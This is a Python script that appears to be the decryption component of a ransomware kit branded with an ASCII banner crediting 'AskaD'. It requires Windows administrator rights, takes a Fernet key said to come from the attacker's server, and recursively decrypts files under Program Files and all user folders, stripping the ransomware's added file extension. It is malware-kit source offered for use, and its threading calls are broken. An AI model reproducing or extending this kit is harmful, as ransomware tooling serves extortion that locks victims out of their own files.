import socket
from cryptography.fernet import Fernet
import base64
import os
import ctypes
import win32ui
import getpass
import threading

key = 'ENTER THE KEY HERE (base64)' # the key can be found in the .txt file created by the server

banner = ''' ▄▄▄        ██████  ██░ ██  ██▓ ▄▄▄      
 ▒████▄    ▒██    ▒ ▓██░ ██▒▓██▒▒████▄    
 ▒██  ▀█▄  ░ ▓██▄   ▒██▀▀██░▒██▒▒██  ▀█▄  
 ░██▄▄▄▄██   ▒   ██▒░▓█ ░██ ░██░░██▄▄▄▄██ 
  ▓█   ▓██▒▒██████▒▒░▓█▒░██▓░██░ ▓█   ▓██▒
  ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░▓   ▒▒   ▓▒█░
   ▒   ▒▒ ░░ ░▒  ░ ░ ▒ ░▒░ ░ ▒ ░  ▒   ▒▒ ░
   ░   ▒   ░  ░  ░   ░  ░░ ░ ▒ ░  ░   ▒   
       ░  ░      ░   ░  ░  ░ ░        ░  ░
 
 
                   \033[31m{ By AskaD }\033[00m
              [=] \033[34mAuthor\033[00m  : AskaD    [=]
                 { \033[34mGithub\033[00m : 3x1t1um }  

'''

print(banner)
print()

def decrypt(path, fern):
	try:	
		with open(path, 'rb') as f:
			data = f.read()
		f.close()

		binfile = fern.decrypt(base64.b64decode(data))
		
		with open(path, 'wb') as f:
			f.write(binfile)
		f.close()
			
		os.rename(path, path[:-7])
		print('[ * ] '+path[:-7]+' > decrypted')
	except:
		print('[ * ] '+path+' > already decrypted')

def listfile(direction, fern):
	for dossier, sous_dossiers, fichiers in os.walk(direction):
		for fichier in fichiers:
			decrypt(os.path.join(dossier,fichier), fern)

if __name__ == '__main__':
	if ctypes.windll.shell32.IsUserAnAdmin() == True:
		fern = Fernet(base64.b64decode(key))

		thred1 = threading.Thread(target=listfile('C:/Program Files', fern))
		thred1.start()

		thred2 = threading.Thread(target=listfile('C:/Users/', fern))
		thred2.start()

		thred3 = threading.Thread(target=listfile('C:/Users/'+getpass.getuser(), fern))
		thred3.start()			

		thred1.join()
		thred2.join()
		thred3.join()
	else:
		win32ui.MessageBox('Please run the script with administrator permissions','Error')
      
